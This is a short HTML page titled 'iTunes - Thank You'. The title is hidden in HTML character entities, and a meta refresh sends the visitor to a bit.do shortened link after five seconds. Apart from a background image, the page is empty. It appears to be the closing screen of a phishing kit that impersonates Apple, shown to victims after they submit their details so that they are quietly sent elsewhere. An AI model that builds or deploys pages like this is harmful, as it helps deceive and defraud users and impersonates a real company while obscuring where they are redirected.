
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>


<meta http-equiv="content-type" content="text/html;charset=utf-8" />
<meta http-equiv="refresh" content="5;url=http://bit.do/applebymrbear" />
<head>
  <title>&#105;&#84;&#117;&#110;&#101;&#115;&#32;&#45;&#32;&#84;&#104;&#97;&#110;&#107;&#32;&#89;&#111;&#117;</title>  
<link rel="icon" href="img/favicon.ico">

</head>
<div>
<body background="img/bg4.png" style="background-repeat: no-repeat" > 


<br><br><br><br><br><br>
<br><br><br><br><br><br>
<br><br><br><br><br><br>
<br><br><br><br><br><br>
<br><br><br><br><br><br>
<br><br><br><br><br><br>
<br><br><br><br><br><br>
<br><br>
</body>

</html>